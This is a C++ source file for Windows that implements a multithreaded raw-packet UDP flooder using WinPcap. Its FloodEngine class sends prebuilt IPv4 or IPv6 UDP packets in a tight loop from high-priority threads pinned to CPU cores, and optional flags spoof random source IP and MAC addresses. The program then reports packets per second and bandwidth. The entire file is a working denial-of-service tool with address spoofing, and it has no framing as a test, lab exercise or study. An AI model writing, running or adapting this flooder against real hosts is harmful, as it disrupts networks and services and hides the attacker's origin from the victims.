// g++ -g udp.cpp -o udp.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <memory>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};

struct ipv4_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct udphdr {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

struct ipv6_header {
    uint32_t vtc_flow;
    uint16_t payload_len;
    uint8_t  next_header;
    uint8_t  hop_limit;
    uint8_t  saddr[16];
    uint8_t  daddr[16];
};
#pragma pack(pop)

bool is_ipv6(const char* ip) {
    struct sockaddr_in6 sa6;
    return inet_pton(AF_INET6, ip, &sa6.sin6_addr) == 1;
}

bool get_local_mac_ipv4(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name_ipv4(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

bool get_local_mac_ipv6(const uint8_t ip[16], uint8_t mac[6]) {
    ULONG size = 0;
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, nullptr, &size);
    std::vector<BYTE> buf(size);
    PIP_ADAPTER_ADDRESSES pAdapters = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, pAdapters, &size) != NO_ERROR)
        return false;
    for (PIP_ADAPTER_ADDRESSES p = pAdapters; p; p = p->Next) {
        for (PIP_ADAPTER_UNICAST_ADDRESS u = p->FirstUnicastAddress; u; u = u->Next) {
            if (u->Address.lpSockaddr->sa_family == AF_INET6) {
                sockaddr_in6* sin6 = (sockaddr_in6*)u->Address.lpSockaddr;
                if (memcmp(sin6->sin6_addr.s6_addr, ip, 16) == 0) {
                    memcpy(mac, p->PhysicalAddress, 6);
                    return true;
                }
            }
        }
    }
    return false;
}

std::string get_interface_name_ipv6(const uint8_t ip[16]) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET6) {
                sockaddr_in6* sin6 = (sockaddr_in6*)addr->addr;
                if (memcmp(sin6->sin6_addr.s6_addr, ip, 16) == 0) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

uint16_t checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n", &tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5],&consumed) != 6)
        return false;
    if (str[consumed] != '\0') return false;
    for (int i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(tmp[i]);
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) { if (i) std::printf(":"); std::printf("%02X", mac[i]); }
    std::printf("\n");
}

class PrebuiltPacket {
public:
    virtual ~PrebuiltPacket() = default;
    virtual size_t getSize() const = 0;
    virtual const uint8_t* getBuffer() const = 0;
    virtual void setSrcMac(const uint8_t mac[6]) = 0;
    virtual void setSrcIp(const void* ip) = 0;
    virtual void setSrcPort(uint16_t port) = 0;
    virtual void recalcChecksum() = 0;
};

class PrebuiltPacketIPv4 : public PrebuiltPacket {
public:
    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(udphdr);
    alignas(64) uint8_t buffer[PACKET_SIZE];
    size_t src_mac_offset;
    size_t src_ip_offset;
    size_t src_port_offset;
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t dst_port;
    uint8_t dst_mac[6];

    PrebuiltPacketIPv4(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac, uint16_t dst_port)
        : src_ip(src_ip), dst_ip(dst_ip), dst_port(dst_port) {
        memcpy(this->dst_mac, dst_mac, 6);
        memset(buffer, 0, PACKET_SIZE);
        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x0800);

        ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
        ip->version = 4; ip->ihl = 5; ip->tos = 0;
        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(udphdr));
        ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 17; ip->check = 0;
        ip->saddr = src_ip; ip->daddr = dst_ip;

        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
        udp->source = 0;
        udp->dest = htons(dst_port);
        udp->len = htons(sizeof(udphdr));
        udp->check = 0;

        src_mac_offset = offsetof(ether_header, ether_shost);
        src_ip_offset = sizeof(ether_header) + offsetof(ipv4_header, saddr);
        src_port_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(udphdr, source);
    }

    size_t getSize() const override { return PACKET_SIZE; }
    const uint8_t* getBuffer() const override { return buffer; }
    void setSrcMac(const uint8_t mac[6]) override { memcpy(buffer + src_mac_offset, mac, 6); }
    void setSrcIp(const void* ip) override {
        src_ip = *(uint32_t*)ip;
        memcpy(buffer + src_ip_offset, ip, 4);
    }
    void setSrcPort(uint16_t port) override {
        uint16_t net_port = htons(port);
        memcpy(buffer + src_port_offset, &net_port, 2);
    }
    void recalcChecksum() override {
        ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
        ip->check = 0;
        ip->check = checksum((uint16_t*)ip, sizeof(ipv4_header));
        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
        udp->check = 0;
        struct pseudo_header {
            uint32_t src;
            uint32_t dst;
            uint8_t zero;
            uint8_t proto;
            uint16_t len;
        } ps;
        ps.src = src_ip;
        ps.dst = dst_ip;
        ps.zero = 0;
        ps.proto = 17;
        ps.len = htons(sizeof(udphdr));
        uint8_t pseudo_buf[sizeof(ps) + sizeof(udphdr)];
        memcpy(pseudo_buf, &ps, sizeof(ps));
        memcpy(pseudo_buf + sizeof(ps), udp, sizeof(udphdr));
        udp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
    }
};

class PrebuiltPacketIPv6 : public PrebuiltPacket {
public:
    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv6_header) + sizeof(udphdr);
    alignas(64) uint8_t buffer[PACKET_SIZE];
    size_t src_mac_offset;
    size_t src_ip_offset;
    size_t src_port_offset;
    uint8_t src_ip[16];
    uint8_t dst_ip[16];
    uint16_t dst_port;
    uint8_t dst_mac[6];

    PrebuiltPacketIPv6(const uint8_t src_ip[16], uint8_t* src_mac, const uint8_t dst_ip[16], uint8_t* dst_mac, uint16_t dst_port)
        : dst_port(dst_port) {
        memcpy(this->dst_mac, dst_mac, 6);
        memcpy(this->src_ip, src_ip, 16);
        memcpy(this->dst_ip, dst_ip, 16);
        memset(buffer, 0, PACKET_SIZE);
        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x86DD);

        ipv6_header* ip6 = (ipv6_header*)(buffer + sizeof(ether_header));
        ip6->vtc_flow = htonl(0x60000000);
        ip6->payload_len = htons(sizeof(udphdr));
        ip6->next_header = 17;
        ip6->hop_limit = 64;
        memcpy(ip6->saddr, src_ip, 16);
        memcpy(ip6->daddr, dst_ip, 16);

        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
        udp->source = 0;
        udp->dest = htons(dst_port);
        udp->len = htons(sizeof(udphdr));
        udp->check = 0;

        src_mac_offset = offsetof(ether_header, ether_shost);
        src_ip_offset = sizeof(ether_header) + offsetof(ipv6_header, saddr);
        src_port_offset = sizeof(ether_header) + sizeof(ipv6_header) + offsetof(udphdr, source);
    }

    size_t getSize() const override { return PACKET_SIZE; }
    const uint8_t* getBuffer() const override { return buffer; }
    void setSrcMac(const uint8_t mac[6]) override { memcpy(buffer + src_mac_offset, mac, 6); }
    void setSrcIp(const void* ip) override {
        memcpy(src_ip, ip, 16);
        memcpy(buffer + src_ip_offset, ip, 16);
    }
    void setSrcPort(uint16_t port) override {
        uint16_t net_port = htons(port);
        memcpy(buffer + src_port_offset, &net_port, 2);
    }
    void recalcChecksum() override {
        struct pseudo_ipv6 {
            uint8_t src[16];
            uint8_t dst[16];
            uint32_t length;
            uint8_t zero[3];
            uint8_t next_header;
        } ps;
        memcpy(ps.src, src_ip, 16);
        memcpy(ps.dst, dst_ip, 16);
        ps.length = htonl(sizeof(udphdr));
        ps.zero[0] = ps.zero[1] = ps.zero[2] = 0;
        ps.next_header = 17;
        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
        udp->check = 0;
        uint8_t pseudo_buf[sizeof(ps) + sizeof(udphdr)];
        memcpy(pseudo_buf, &ps, sizeof(ps));
        memcpy(pseudo_buf + sizeof(ps), udp, sizeof(udphdr));
        udp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
    }
};

class FloodEngine {
private:
    pcap_t* pcap_handle;
    std::unique_ptr<PrebuiltPacket> packet;
    std::atomic<uint64_t>& total_packets_sent;
    std::atomic<bool>& stop_flag;
    uint16_t port_counter;
    bool random_ip;
    bool random_mac;
    bool is_ipv6_mode;

public:
    FloodEngine(pcap_t* handle, void* src_ip, uint8_t* src_mac, void* dst_ip, uint8_t* dst_mac,
                uint16_t dst_port, int thread_index, std::atomic<uint64_t>& total_counter,
                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag, bool ipv6)
        : pcap_handle(handle), total_packets_sent(total_counter), stop_flag(stop),
          port_counter(1024 + thread_index * 1000), random_ip(random_ip_flag), random_mac(random_mac_flag),
          is_ipv6_mode(ipv6) {
        if (ipv6) {
            packet = std::make_unique<PrebuiltPacketIPv6>((uint8_t*)src_ip, src_mac, (uint8_t*)dst_ip, dst_mac, dst_port);
        } else {
            packet = std::make_unique<PrebuiltPacketIPv4>(*(uint32_t*)src_ip, src_mac, *(uint32_t*)dst_ip, dst_mac, dst_port);
        }
    }

    void start(int core_id) {
        HANDLE hThread = GetCurrentThread();
        SetThreadAffinityMask(hThread, 1ULL << core_id);
        SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);

        uint32_t seed = time(nullptr) + core_id * 1000;
        auto lcg = [](uint32_t& s) -> uint32_t {
            s = s * 1103515245 + 12345;
            return (s >> 16) & 0x7FFF;
        };

        while (!stop_flag.load(std::memory_order_relaxed)) {
            if (random_ip) {
                if (is_ipv6_mode) {
                    uint8_t rand_ip[16];
                    for (int i = 0; i < 16; ++i) rand_ip[i] = lcg(seed) & 0xFF;
                    rand_ip[0] &= 0xFE;
                    packet->setSrcIp(rand_ip);
                } else {
                    uint32_t rand_ip = (lcg(seed) & 0xFF) << 24 | (lcg(seed) & 0xFF) << 16 |
                                       (lcg(seed) & 0xFF) << 8 | (lcg(seed) & 0xFF);
                    packet->setSrcIp(&rand_ip);
                }
            }
            if (random_mac) {
                uint8_t mac[6];
                mac[0] = (lcg(seed) & 0xFE);
                for (int i = 1; i < 6; ++i) mac[i] = lcg(seed) & 0xFF;
                packet->setSrcMac(mac);
            }
            uint16_t port = port_counter++;
            if (port_counter > 65535) port_counter = 1024;
            packet->setSrcPort(port);
            packet->recalcChecksum();

            if (pcap_sendpacket(pcap_handle, packet->getBuffer(), (int)packet->getSize()) == 0) {
                total_packets_sent.fetch_add(1, std::memory_order_relaxed);
            } else {
                static thread_local uint32_t error_counter = 0;
                if ((++error_counter % 1000) == 1)
                    std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap_handle) << std::endl;
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 6) {
        std::cerr << "Usage: " << argv[0]
                  << " <src_ip> <dst_ip> <dst_port> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n";
        return 1;
    }

    bool ipv6_src = is_ipv6(argv[1]);
    bool ipv6_dst = is_ipv6(argv[2]);
    if (ipv6_src != ipv6_dst) {
        std::cerr << "Source and destination IP must be of same family\n";
        return 1;
    }
    bool ipv6 = ipv6_src;

    uint32_t src_ip4 = 0;
    uint8_t src_ip6[16] = {0};
    uint32_t dst_ip4 = 0;
    uint8_t dst_ip6[16] = {0};

    if (ipv6) {
        inet_pton(AF_INET6, argv[1], src_ip6);
        inet_pton(AF_INET6, argv[2], dst_ip6);
    } else {
        src_ip4 = inet_addr(argv[1]);
        dst_ip4 = inet_addr(argv[2]);
    }

    uint16_t dst_port = (uint16_t)atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    int duration = atoi(argv[5]);
    if (dst_port == 0 || num_threads <= 0 || duration < 0) return 1;

    uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool random_ip = false, random_mac = false;
    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
        else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
        else if (parse_mac_strict(argv[i], dst_mac)) { /* ok */ }
        else std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf) == -1) {
        std::cerr << "pcap_init failed: " << errbuf << std::endl;
        return 1;
    }

    std::string ifname;
    uint8_t src_mac[6] = {0};
    if (ipv6) {
        bool has_src = false;
        for (int i = 0; i < 16; ++i) if (src_ip6[i] != 0) { has_src = true; break; }
        if (has_src) {
            ifname = get_interface_name_ipv6(src_ip6);
            if (ifname.empty()) { std::cerr << "Interface not found\n"; return 1; }
            if (!random_mac && !get_local_mac_ipv6(src_ip6, src_mac)) {
                std::cerr << "Cannot get local MAC\n"; return 1;
            }
        } else {
            pcap_if_t *alldevs;
            if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) return 1;
            if (alldevs) { ifname = alldevs->name; pcap_freealldevs(alldevs); }
            else { std::cerr << "No interfaces\n"; return 1; }
        }
    } else {
        if (src_ip4 != 0) {
            ifname = get_interface_name_ipv4(src_ip4);
            if (ifname.empty()) { std::cerr << "Interface not found\n"; return 1; }
            if (!random_mac && !get_local_mac_ipv4(src_ip4, src_mac)) {
                std::cerr << "Cannot get local MAC\n"; return 1;
            }
        } else {
            pcap_if_t *alldevs;
            if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) return 1;
            if (alldevs) { ifname = alldevs->name; pcap_freealldevs(alldevs); }
            else { std::cerr << "No interfaces\n"; return 1; }
        }
    }

    pcap_t* temp = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
    if (!temp || pcap_datalink(temp) != DLT_EN10MB) { std::cerr << "Link error\n"; return 1; }
    pcap_close(temp);

    std::vector<pcap_t*> handles;
    for (int i = 0; i < num_threads; i++) {
        pcap_t* h = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
        if (!h) { for (auto hh : handles) pcap_close(hh); return 1; }
        handles.push_back(h);
    }

    std::cout << "Interface: " << ifname << "\nDestination MAC: "; print_mac(dst_mac);
    std::cout << "Random IP: " << (random_ip ? "yes" : "no") << "\nRandom MAC: " << (random_mac ? "yes" : "no") << "\n";
    std::cout << "IPv6 mode: " << (ipv6 ? "yes" : "no") << "\n";

    std::atomic<uint64_t> total_packets(0);
    std::atomic<bool> stop(false);
    std::vector<std::thread> workers;
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD cores = si.dwNumberOfProcessors;

    auto start = std::chrono::steady_clock::now();
    for (int i = 0; i < num_threads; i++) {
        void* src_ptr = ipv6 ? (void*)src_ip6 : (void*)&src_ip4;
        void* dst_ptr = ipv6 ? (void*)dst_ip6 : (void*)&dst_ip4;
        auto engine = std::make_unique<FloodEngine>(handles[i], src_ptr, src_mac, dst_ptr, dst_mac,
                                                    dst_port, i, total_packets, stop, random_ip, random_mac, ipv6);
        workers.emplace_back(&FloodEngine::start, engine.get(), i % cores);
        engine.release();
    }

    if (duration > 0) std::this_thread::sleep_for(std::chrono::seconds(duration));
    else { std::cout << "Press Enter to stop...\n"; std::cin.get(); }
    stop = true;
    for (auto& w : workers) if (w.joinable()) w.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
    uint64_t pkts = total_packets.load();
    if (elapsed == 0) elapsed = 1;
    double pps = pkts * 1000.0 / elapsed;
    size_t pkt_size = ipv6 ? PrebuiltPacketIPv6::PACKET_SIZE : PrebuiltPacketIPv4::PACKET_SIZE;
    double mbps = (pps * pkt_size * 8) / 1e6;
    std::cout << "\n--- Results ---\nTotal packets: " << pkts << "\nDuration: " << elapsed << " ms\nThroughput: " << pps << " pps\nBandwidth: " << mbps << " Mbps\n";
    for (auto h : handles) pcap_close(h);
    return 0;
}